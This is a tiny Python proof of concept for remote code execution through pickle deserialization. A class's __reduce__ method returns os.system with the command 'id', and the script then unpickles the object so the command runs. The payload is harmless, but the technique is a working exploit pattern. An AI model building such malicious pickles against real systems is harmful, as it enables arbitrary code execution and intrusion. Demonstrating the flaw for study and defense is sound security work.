import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickled = pickle.dumps(RCE())
print(pickled)

unpickled = pickle.loads(pickled)
